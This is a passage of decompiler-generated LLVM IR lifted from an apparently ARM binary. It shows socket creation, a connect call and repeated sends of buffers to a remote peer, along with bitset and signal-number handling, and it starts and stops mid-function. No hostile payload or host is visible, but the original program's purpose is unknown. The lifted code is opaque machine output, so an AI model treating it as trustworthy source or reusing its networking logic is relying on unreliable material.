  %v1_11738 = add i32 %v0_11734, 4
  %v2_11738 = inttoptr i32 %v1_11738 to i32*
  %v3_11738 = load i32, i32* %v2_11738, align 4
  store i32 %v3_11738, i32* %r0.global-to-local, align 4
  %v1_1173c = add i32 %v2_11734, 13
  %v2_1173c = inttoptr i32 %v1_1173c to i8*
  %v3_1173c = load i8, i8* %v2_1173c, align 1
  %v4_1173c = zext i8 %v3_1173c to i32
  store i32 %v4_1173c, i32* %r2.global-to-local, align 4
  %v1_11740 = add i32 %v2_11734, 4
  %v2_11740 = inttoptr i32 %v1_11740 to i32*
  %v3_11740 = load i32, i32* %v2_11740, align 4
  store i32 %v3_11740, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11748 = call i32 @function_13884(i32 %v3_11738, i32 %v3_11740, i32 %v4_1173c, i32 16384)
  store i32 %v4_11748, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11750 = load i32, i32* @r6, align 4
  %v1_11750 = add i32 %v0_11750, 4
  %v2_11750 = inttoptr i32 %v1_11750 to i32*
  %v3_11750 = load i32, i32* %v2_11750, align 4
  store i32 %v3_11750, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1175c = call i32 @function_13884(i32 %v3_11750, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 %v4_1175c, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_11764 = load i32, i32* @r6, align 4
  %v2_11764 = add i32 %v1_11764, 12
  %v3_11764 = inttoptr i32 %v2_11764 to i32*
  store i32 5, i32* %v3_11764, align 4
  br label %dec_label_pc_11510

dec_label_pc_1176c:                               ; preds = %dec_label_pc_10ea8
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11778 = call i32 @function_11be8(i32 25)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11788 = call i32 @function_11b24(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_11788, i32* %r0.global-to-local, align 4
  %v3_1178c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11788, i32* %r2.global-to-local, align 4
  %v1_11794 = add i32 %v3_1178c, -1
  store i32 %v1_11794, i32* %r3.global-to-local, align 4
  %v0_11798 = load i32, i32* @r6, align 4
  %v1_11798 = add i32 %v0_11798, 24
  %v2_11798 = inttoptr i32 %v1_11798 to i32*
  %v3_11798 = load i32, i32* %v2_11798, align 4
  store i32 %v3_11798, i32* %r1.global-to-local, align 4
  %v0_1179c = load i32, i32* @fp, align 4
  store i32 %v0_1179c, i32* %r0.global-to-local, align 4
  %v4_117a0 = call i32 @function_12538(i32 %v0_1179c, i32 %v3_11798, i32 %v3_11788, i32 %v1_11794)
  store i32 %v4_117a0, i32* @r8, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_117ac = call i32 @function_11b48(i32 25)
  store i32 %v1_117ac, i32* @r0, align 4
  %v0_117b0 = load i32, i32* @r8, align 4
  %v2_117b0 = icmp eq i32 %v0_117b0, -1
  store i1 %v2_117b0, i1* %cpsr_c.global-to-local, align 1
  %v7_117b0 = icmp eq i32 %v0_117b0, -1
  store i1 %v7_117b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117b0, label %dec_label_pc_10d80.loopexit, label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_1176c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117b8 = icmp eq i32 %v0_117b0, 0
  store i1 %v2_117b8, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_117b0, 1
  br i1 %tmp411, label %dec_label_pc_11510, label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %dec_label_pc_117b8
  %v0_117c0 = load i32, i32* @r6, align 4
  %v1_117c0 = add i32 %v0_117c0, 20
  %v2_117c0 = inttoptr i32 %v1_117c0 to i16*
  %v3_117c0 = load i16, i16* %v2_117c0, align 2
  %v4_117c0 = zext i16 %v3_117c0 to i32
  store i32 %v4_117c0, i32* %r3.global-to-local, align 4
  %v1_117c4 = add i32 %v0_117c0, 16
  %v2_117c4 = inttoptr i32 %v1_117c4 to i32*
  %v3_117c4 = load i32, i32* %v2_117c4, align 4
  store i32 %v3_117c4, i32* %r2.global-to-local, align 4
  store i32 %v2_117c8, i32* @lr, align 4
  store i32 %v4_117c0, i32* %stack_var_-42, align 4
  store i32 %v3_117c4, i32* %stack_var_-60, align 4
  %v1_117d4 = inttoptr i32 %v0_117c0 to i32*
  %v2_117d4 = load i32, i32* %v1_117d4, align 4
  store i32 %v2_117d4, i32* @sb, align 4
  %v0_117d8 = call i32 @function_12e08()
  store i32 %v0_117d8, i32* %r0.global-to-local, align 4
  %v7_117dc = icmp eq i32 %v0_117d8, -1
  %.422 = zext i1 %v7_117dc to i32
  store i32 %.422, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117e8 = icmp eq i32 %v0_117d8, 0
  store i1 %v2_117e8, i1* %cpsr_z.global-to-local, align 1
  %tmp414 = icmp slt i32 %v0_117d8, 1
  br i1 %tmp414, label %bb415, label %.thread115

.thread115:                                       ; preds = %dec_label_pc_117c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11840

bb415:                                            ; preds = %dec_label_pc_117c0
  store i32 %.422, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_117f4 = icmp eq i1 %v7_117dc, false
  store i1 %v2_117f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117f4, label %dec_label_pc_117fc, label %dec_label_pc_11840

dec_label_pc_117fc:                               ; preds = %bb415
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11808 = call i32 @function_13940(i32 2, i32 1, i32 0)
  store i32 %v3_11808, i32* %r0.global-to-local, align 4
  %v2_1180c = icmp eq i32 %v3_11808, -1
  store i1 %v2_1180c, i1* %cpsr_c.global-to-local, align 1
  %v7_1180c = icmp eq i32 %v3_11808, -1
  store i1 %v7_1180c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11808, i32* @r7, align 4
  br i1 %v7_1180c, label %dec_label_pc_11ab8, label %dec_label_pc_11818

dec_label_pc_11818:                               ; preds = %dec_label_pc_117fc
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_1181c = call i32 @function_11be8(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11824 = call i32 @function_11be8(i32 19)
  %v0_11828 = load i32, i32* @sl, align 4
  store i32 %v0_11828, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_11830 = inttoptr i32 %v0_11828 to i32*
  %v3_11830 = call i32 @function_11b24(i32 18, i32* %v2_11830)
  store i32 %v3_11830, i32* %r0.global-to-local, align 4
  %v1_11834 = call i32 @function_fa04(i32 %v3_11830)
  store i32 %v1_11834, i32* %r0.global-to-local, align 4
  store i32 %v1_11834, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_11838 = icmp eq i32 %v1_11834, 0
  store i1 %v3_11838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11838, label %dec_label_pc_11840, label %dec_label_pc_11998

dec_label_pc_11840:                               ; preds = %.thread115, %dec_label_pc_11818, %bb415
  %v0_11840 = load i32, i32* @r6, align 4
  %v1_11840 = add i32 %v0_11840, 4
  %v2_11840 = inttoptr i32 %v1_11840 to i32*
  %v3_11840 = load i32, i32* %v2_11840, align 4
  store i32 %v3_11840, i32* %r0.global-to-local, align 4
  %v1_11844 = call i32 @function_1314c(i32 %v3_11840)
  store i32 %v1_11844, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_11850 = load i32, i32* @r6, align 4
  %v2_11850 = add i32 %v1_11850, 4
  %v3_11850 = inttoptr i32 %v2_11850 to i32*
  store i32 -1, i32* %v3_11850, align 4
  %v0_11854 = load i32, i32* %r2.global-to-local, align 4
  %v1_11854 = load i32, i32* @r6, align 4
  %v2_11854 = add i32 %v1_11854, 12
  %v3_11854 = inttoptr i32 %v2_11854 to i32*
  store i32 %v0_11854, i32* %v3_11854, align 4
  br label %dec_label_pc_11510

dec_label_pc_1185c:                               ; preds = %dec_label_pc_10d8c
  store i32 %.pre, i32* @r0, align 4
  %v1_11864 = add i32 %v0_1185c, 92
  store i32 %v1_11864, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_1186c = call i32 @function_13670(i32 %.pre, i32 %v1_11864, i32 192)
  store i32 %v3_1186c, i32* %r0.global-to-local, align 4
  %v0_11870 = load i32, i32* @r6, align 4
  %v1_11870 = add i32 %v0_11870, 24
  %v2_11870 = inttoptr i32 %v1_11870 to i32*
  %v3_11870 = load i32, i32* %v2_11870, align 4
  %v1_11874 = add i32 %v3_11870, -64
  store i32 %v1_11874, i32* %r3.global-to-local, align 4
  store i32 %v1_11874, i32* %v2_11870, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_11880:                               ; preds = %dec_label_pc_116c4
  store i32 %v2_11684, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_1188c = add i32 %v0_116b0, 4
  %v2_1188c = inttoptr i32 %v1_1188c to i32*
  %v3_1188c = load i32, i32* %v2_1188c, align 4
  store i32 %v3_1188c, i32* %r0.global-to-local, align 4
  %v4_11890 = call i32 @function_13884(i32 %v3_1188c, i32 %v2_11684, i32 3, i32 16384)
  store i32 %v4_11890, i32* %r0.global-to-local, align 4
  %v0_11894 = load i32, i32* @r6, align 4
  %v1_11894 = add i32 %v0_11894, 4
  %v2_11894 = inttoptr i32 %v1_11894 to i32*
  %v3_11894 = load i32, i32* %v2_11894, align 4
  store i32 %v3_11894, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11654

dec_label_pc_118a4:                               ; preds = %dec_label_pc_10ee0
  %v0_118a4 = load i32, i32* @r6, align 4
  store i32 %v0_118a4, i32* @r0, align 4
  %v0_118a8 = call i32 @function_ff34()
  store i32 %v0_118a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f1c

dec_label_pc_118b0:                               ; preds = %dec_label_pc_10d44
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_11a20, i32* %r3.global-to-local, align 4
  store i32 %v2_11428, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_118d8 = call i32 @function_13798(i32 %v3_10d38, i32 1, i32 4, i32 %v2_11a20, i32 %v2_11428)
  %v3_118dc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_118dc, i32* %r3.global-to-local, align 4
  %v2_118e0 = or i32 %v3_118dc, %v5_118d8
  store i32 %v2_118e0, i32* %r0.global-to-local, align 4
  %v4_118e0 = icmp eq i32 %v2_118e0, 0
  store i1 %v4_118e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_118e0, label %dec_label_pc_118e8, label %dec_label_pc_1197c

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118b0
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_118ec = load i32, i32* @r6, align 4
  %v2_118ec = add i32 %v1_118ec, 12
  %v3_118ec = inttoptr i32 %v2_118ec to i32*
  store i32 2, i32* %v3_118ec, align 4
  %v0_118f0 = call i32 @function_f700()
  store i32 %v0_118f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_2135c.189 to i32), i32* %r3.global-to-local, align 4
  %v2_118f8 = load i16, i16* bitcast (i16** @global_var_2135c.189 to i16*), align 4
  %v3_118f8 = zext i16 %v2_118f8 to i32
  store i32 %v3_118f8, i32* %r1.global-to-local, align 4
  %v3_118fc = call i32 @function_12b6c(i32 %v0_118f0, i32 %v3_118f8)
  store i32 %v3_118fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2132c.185 to i32), i32* %r3.global-to-local, align 4
  %v2_11904 = load i32, i32* @global_var_2132c.185, align 4
  store i32 %v2_11904, i32* %ip.global-to-local, align 4
  %v1_1190c = load i32, i32* @r4, align 4
  %v9_1190c = icmp eq i32 %v2_11904, %v1_1190c
  store i1 %v9_1190c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_118f8, i32* %r1.global-to-local, align 4
  %v7_11914 = icmp sgt i32 %v2_11904, %v1_1190c
  br i1 %v7_11914, label %dec_label_pc_11918, label %dec_label_pc_11958

dec_label_pc_11918:                               ; preds = %dec_label_pc_118e8
  %v2_1191c = load i32, i32* @global_var_21358.187, align 4
  store i32 %v2_1191c, i32* %r3.global-to-local, align 4
  store i32 %v1_1190c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11938

dec_label_pc_11928:                               ; preds = %dec_label_pc_11948, %dec_label_pc_11938
  %v1_11928 = add i32 %v0_11928, 1
  store i32 %v1_11928, i32* %r2.global-to-local, align 4
  %v9_1192c = icmp eq i32 %v1_11928, %v2_11904
  %v1_11930 = add i32 %v0_11930, 16
  store i32 %v1_11930, i32* %r3.global-to-local, align 4
  br i1 %v9_1192c, label %dec_label_pc_11958.loopexit, label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_11928, %dec_label_pc_11918
  %v0_11928 = phi i32 [ %v1_11928, %dec_label_pc_11928 ], [ %v1_1190c, %dec_label_pc_11918 ]
  %v0_11930 = phi i32 [ %v1_11930, %dec_label_pc_11928 ], [ %v2_1191c, %dec_label_pc_11918 ]
  store i32 %v0_11930, i32* %r0.global-to-local, align 4
  %v1_1193c = add i32 %v0_11930, 8
  %v2_1193c = inttoptr i32 %v1_1193c to i16*
  %v3_1193c = load i16, i16* %v2_1193c, align 2
  %v4_1193c = zext i16 %v3_1193c to i32
  store i32 %v4_1193c, i32* %r3.global-to-local, align 4
  %tmp416 = icmp ugt i16 %v3_1193c, %v2_118f8
  br i1 %tmp416, label %dec_label_pc_11928, label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %dec_label_pc_11938
  %v1_11948 = add i32 %v0_11930, 10
  %v2_11948 = inttoptr i32 %v1_11948 to i16*
  %v3_11948 = load i16, i16* %v2_11948, align 2
  %v4_11948 = zext i16 %v3_11948 to i32
  store i32 %v4_11948, i32* %r3.global-to-local, align 4
  %v3_1194c = icmp uge i16 %v3_11948, %v2_118f8
  %v9_1194c = icmp eq i16 %v3_11948, %v2_118f8
  %v2_11950 = xor i1 %v3_1194c, true
  %v3_11950 = or i1 %v9_1194c, %v2_11950
  br i1 %v3_11950, label %dec_label_pc_11928, label %dec_label_pc_1195c.loopexit

dec_label_pc_11958.loopexit:                      ; preds = %dec_label_pc_11928
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11958

dec_label_pc_11958:                               ; preds = %dec_label_pc_11958.loopexit, %dec_label_pc_118e8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1195c

dec_label_pc_1195c.loopexit:                      ; preds = %dec_label_pc_11948
  store i1 %v3_1194c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1195c

dec_label_pc_1195c:                               ; preds = %dec_label_pc_1195c.loopexit, %dec_label_pc_11958
  %v0_11970 = phi i32 [ %v0_11930, %dec_label_pc_1195c.loopexit ], [ 0, %dec_label_pc_11958 ]
  %v0_1195c = load i32, i32* @r6, align 4
  %v1_1195c = add i32 %v0_1195c, 4
  %v2_1195c = inttoptr i32 %v1_1195c to i32*
  %v3_1195c = load i32, i32* %v2_1195c, align 4
  %v3_11960 = udiv i32 %v3_1195c, 32
  store i32 %v3_11960, i32* %r2.global-to-local, align 4
  %v1_11964 = urem i32 %v3_1195c, 32
  store i32 %v1_11964, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11968 = mul nuw nsw i32 %v3_11960, 4
  store i32 %v3_11968, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11970 = inttoptr i32 %v0_1195c to i32*
  store i32 %v0_11970, i32* %v2_11970, align 4
  %v0_11974 = load i32, i32* %r3.global-to-local, align 4
  %v1_11974 = load i32, i32* @r6, align 4
  %v2_11974 = add i32 %v1_11974, 24
  %v3_11974 = inttoptr i32 %v2_11974 to i32*
  store i32 %v0_11974, i32* %v3_11974, align 4
  %v0_10d6c.pre = load i32, i32* @ip, align 4
  %v1_10d74.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d68

dec_label_pc_1197c:                               ; preds = %dec_label_pc_118b0
  %v0_1197c = load i32, i32* @r6, align 4
  %v1_1197c = add i32 %v0_1197c, 4
  %v2_1197c = inttoptr i32 %v1_1197c to i32*
  %v3_1197c = load i32, i32* %v2_1197c, align 4
  store i32 %v3_1197c, i32* %r0.global-to-local, align 4
  %v1_11980 = call i32 @function_1314c(i32 %v3_1197c)
  store i32 %v1_11980, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11988 = load i32, i32* @r4, align 4
  %v1_11988 = load i32, i32* @r6, align 4
  %v2_11988 = add i32 %v1_11988, 12
  %v3_11988 = inttoptr i32 %v2_11988 to i32*
  store i32 %v0_11988, i32* %v3_11988, align 4
  %v0_1198c = load i32, i32* %r3.global-to-local, align 4
  %v1_1198c = load i32, i32* @r6, align 4
  %v2_1198c = add i32 %v1_1198c, 4
  %v3_1198c = inttoptr i32 %v2_1198c to i32*
  store i32 %v0_1198c, i32* %v3_1198c, align 4
  %v0_11990 = load i32, i32* @r4, align 4
  %v1_11990 = trunc i32 %v0_11990 to i8
  %v2_11990 = load i32, i32* @r6, align 4
  %v3_11990 = add i32 %v2_11990, 284
  %v4_11990 = inttoptr i32 %v3_11990 to i8*
  store i8 %v1_11990, i8* %v4_11990, align 1
  br label %dec_label_pc_10e90

dec_label_pc_11998:                               ; preds = %dec_label_pc_11818
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v2_117c8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_119a4 = add i32 %v1_11834, 4
  %v2_119a4 = inttoptr i32 %v1_119a4 to i32*
  %v3_119a4 = load i32, i32* %v2_119a4, align 4
  store i32 %v3_119a4, i32* @r4, align 4
  %v0_119a8 = call i32 @function_f700()
  store i32 %v0_119a8, i32* %r0.global-to-local, align 4
  %v0_119ac = load i32, i32* @r5, align 4
  %v1_119ac = inttoptr i32 %v0_119ac to i8*
  %v2_119ac = load i8, i8* %v1_119ac, align 1
  %v3_119ac = zext i8 %v2_119ac to i32
  store i32 %v3_119ac, i32* %r1.global-to-local, align 4
  %v2_119b0 = call i32 @function_12b6c(i32 %v0_119a8, i32 %v3_119ac)
  store i32 %v2_119b0, i32* %r0.global-to-local, align 4
  %v0_119b4 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_119b4 = mul nuw nsw i32 %v3_119ac, 4
  %v5_119b4 = add i32 %v0_119b4, %v4_119b4
  %v6_119b4 = inttoptr i32 %v5_119b4 to i32*
  %v7_119b4 = load i32, i32* %v6_119b4, align 4
  store i32 %v7_119b4, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v0_119bc = load i32, i32* @sl, align 4
  store i32 %v0_119bc, i32* %r1.global-to-local, align 4
  %v2_119c4 = inttoptr i32 %v0_119bc to i32*
  %v3_119c4 = call i32 @function_11b24(i32 19, i32* %v2_119c4)
  store i32 %v2_117c8, i32* %r2.global-to-local, align 4
  %v0_119d4 = load i32, i32* @r5, align 4
  store i32 %v0_119d4, i32* %r0.global-to-local, align 4
  %v1_119d8 = call i32 @function_f9dc(i32 %v0_119d4)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_119e0 = call i32 @function_11b48(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_119e8 = call i32 @function_11b48(i32 19)
  %v0_119f0 = load i32, i32* @r7, align 4
  store i32 %v0_119f0, i32* %r0.global-to-local, align 4
  store i32 %v2_119f4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_119fc = call i32 @function_13728(i32 %v0_119f0, i32 %v2_119f4, i32 16)
  store i32 %v3_119fc, i32* %r0.global-to-local, align 4
  %v3_11a00 = icmp eq i32 %v3_119fc, -1
  store i1 %v3_11a00, i1* %cpsr_c.global-to-local, align 1
  %v8_11a00 = icmp eq i32 %v3_119fc, -1
  store i1 %v8_11a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11a00, label %dec_label_pc_11a08, label %dec_label_pc_11a18

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11998
  %v0_11a08 = load i32, i32* @r7, align 4
  store i32 %v0_11a08, i32* %r0.global-to-local, align 4
  %v1_11a0c = call i32 @function_1314c(i32 %v0_11a08)
  %v0_11a10 = load i32, i32* @sl, align 4
  store i32 %v0_11a10, i32* %r0.global-to-local, align 4
  %v1_11a14 = call i32 @function_15194(i32 %v0_11a10)
  store i32 %v1_11a14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_11998, %dec_label_pc_11a08
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_11a20, i32* %r1.global-to-local, align 4
  %v0_11a24 = load i32, i32* @r7, align 4
  store i32 %v0_11a24, i32* %r0.global-to-local, align 4
  %v0_11a28 = load i32, i32* @sl, align 4
  store i32 %v0_11a28, i32* %stack_var_-56, align 4
  %v5_11a2c = call i32 @function_13884(i32 %v0_11a24, i32 %v2_11a20, i32 1, i32 16384)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a40 = load i32, i32* @r7, align 4
  store i32 %v0_11a40, i32* %r0.global-to-local, align 4
  %v4_11a44 = call i32 @function_13884(i32 %v0_11a40, i32 %v2_11428, i32 4, i32 16384)
  store i32 %v2_11a4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a58 = load i32, i32* @r7, align 4
  store i32 %v0_11a58, i32* %r0.global-to-local, align 4
  %v4_11a5c = call i32 @function_13884(i32 %v0_11a58, i32 %v2_11a4c, i32 2, i32 16384)
  %v0_11a60 = load i32, i32* @sb, align 4
  %v1_11a60 = add i32 %v0_11a60, 12
  store i32 %v1_11a60, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a6c = load i32, i32* @r7, align 4
  store i32 %v0_11a6c, i32* %r0.global-to-local, align 4
  %v4_11a70 = call i32 @function_13884(i32 %v0_11a6c, i32 %v1_11a60, i32 1, i32 16384)
  store i32 %v4_11a70, i32* %r0.global-to-local, align 4
  %v0_11a74 = load i32, i32* @sb, align 4
  %v1_11a74 = inttoptr i32 %v0_11a74 to i32*
  %v2_11a74 = load i32, i32* %v1_11a74, align 4
  store i32 %v2_11a74, i32* %r1.global-to-local, align 4
  %v1_11a78 = add i32 %v0_11a74, 12
  %v2_11a78 = inttoptr i32 %v1_11a78 to i8*
  %v3_11a78 = load i8, i8* %v2_11a78, align 1
  %v4_11a78 = zext i8 %v3_11a78 to i32
  store i32 %v4_11a78, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a80 = load i32, i32* @r7, align 4
  store i32 %v0_11a80, i32* %r0.global-to-local, align 4
  %v4_11a84 = call i32 @function_13884(i32 %v0_11a80, i32 %v2_11a74, i32 %v4_11a78, i32 16384)
  %v0_11a88 = load i32, i32* @sb, align 4
  %v1_11a88 = add i32 %v0_11a88, 13
  store i32 %v1_11a88, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11a94 = load i32, i32* @r7, align 4
  store i32 %v0_11a94, i32* %r0.global-to-local, align 4
  %v4_11a98 = call i32 @function_13884(i32 %v0_11a94, i32 %v1_11a88, i32 1, i32 16384)
  %v0_11a9c = load i32, i32* @r7, align 4
  store i32 %v0_11a9c, i32* %r0.global-to-local, align 4
  %v0_11aa0 = load i32, i32* @sb, align 4
  %v1_11aa0 = add i32 %v0_11aa0, 13
  %v2_11aa0 = inttoptr i32 %v1_11aa0 to i8*
  %v3_11aa0 = load i8, i8* %v2_11aa0, align 1
  %v4_11aa0 = zext i8 %v3_11aa0 to i32
  store i32 %v4_11aa0, i32* %r2.global-to-local, align 4
  %v1_11aa4 = add i32 %v0_11aa0, 4
  %v2_11aa4 = inttoptr i32 %v1_11aa4 to i32*
  %v3_11aa4 = load i32, i32* %v2_11aa4, align 4
  store i32 %v3_11aa4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11aac = call i32 @function_13884(i32 %v0_11a9c, i32 %v3_11aa4, i32 %v4_11aa0, i32 16384)
  %v0_11ab0 = load i32, i32* @r7, align 4
  store i32 %v0_11ab0, i32* %r0.global-to-local, align 4
  %v1_11ab4 = call i32 @function_1314c(i32 %v0_11ab0)
  store i32 %v1_11ab4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_11a18
  %v0_11ab8 = load i32, i32* @sl, align 4
  store i32 %v0_11ab8, i32* %r0.global-to-local, align 4
  %v1_11abc = call i32 @function_15194(i32 %v0_11ab8)
  store i32 %v1_11abc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %dec_label_pc_114ec, %dec_label_pc_11ab8
  %v0_11ac0 = load i32, i32* @fp, align 4
  store i32 %v0_11ac0, i32* %r0.global-to-local, align 4
  %v0_11ac4 = load i32, i32* @r6, align 4
  %v1_11ac4 = add i32 %v0_11ac4, 24
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i32*
  %v3_11ac4 = load i32, i32* %v2_11ac4, align 4
  store i32 %v3_11ac4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18798.326 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_11ad0 = call i32 @function_12538(i32 %v0_11ac0, i32 %v3_11ac4, i32 ptrtoint ([6 x i8]* @global_var_18798.326 to i32), i32 5)
  store i32 %v5_11ad0, i32* %r0.global-to-local, align 4
  %v3_11ad4 = icmp eq i32 %v5_11ad0, -1
  store i1 %v3_11ad4, i1* %cpsr_c.global-to-local, align 1
  %v8_11ad4 = icmp eq i32 %v5_11ad0, -1
  store i1 %v8_11ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_11ad0, i32* @r8, align 4
  br i1 %v3_11ad4, label %dec_label_pc_10d80.loopexit, label %dec_label_pc_11508

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_10bdc
  store i32 %v3_11ae4, i32* %r0.global-to-local, align 4
  %v3_11ae8 = udiv i32 %v3_11ae4, 32
  %v3_11aec = mul nuw nsw i32 %v3_11ae8, 4
  store i32 %v2_11af0, i32* @lr, align 4
  %v2_11af4 = add i32 %v3_11aec, %v2_11af0
  store i32 %v2_11af4, i32* %r3.global-to-local, align 4
  %v1_11af8 = add i32 %v2_11af4, -312
  %v2_11af8 = inttoptr i32 %v1_11af8 to i32*
  %v3_11af8 = load i32, i32* %v2_11af8, align 4
  %v1_11afc = urem i32 %v3_11ae4, 32
  store i32 %v1_11afc, i32* %r1.global-to-local, align 4
  %v7_11b00 = shl i32 1, %v1_11afc
  %v8_11b00 = or i32 %v3_11af8, %v7_11b00
  store i32 %v8_11b00, i32* %r2.global-to-local, align 4
  %v0_11b04 = load i32, i32* @r5, align 4
  %v3_11b04 = icmp uge i32 %v0_11b04, %v3_11ae4
  store i1 %v3_11b04, i1* %cpsr_c.global-to-local, align 1
  %v9_11b04 = icmp eq i32 %v0_11b04, %v3_11ae4
  store i1 %v9_11b04, i1* %cpsr_z.global-to-local, align 1
  %v5_11b08 = icmp slt i32 %v0_11b04, %v3_11ae4
  br i1 %v5_11b08, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_11ae4
  store i32 %v3_11ae4, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_11ae4, %bb417
  store i32 %v8_11b00, i32* %v2_11af8, align 4
  br label %bb369

dec_label_pc_11b14:                               ; preds = %dec_label_pc_10e3c
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_10da4, align 4
  br label %dec_label_pc_10e58

; uselistorder directives
  uselistorder i32 %v0_11b04, { 0, 2, 1 }
  uselistorder i32 %v1_11afc, { 1, 0 }
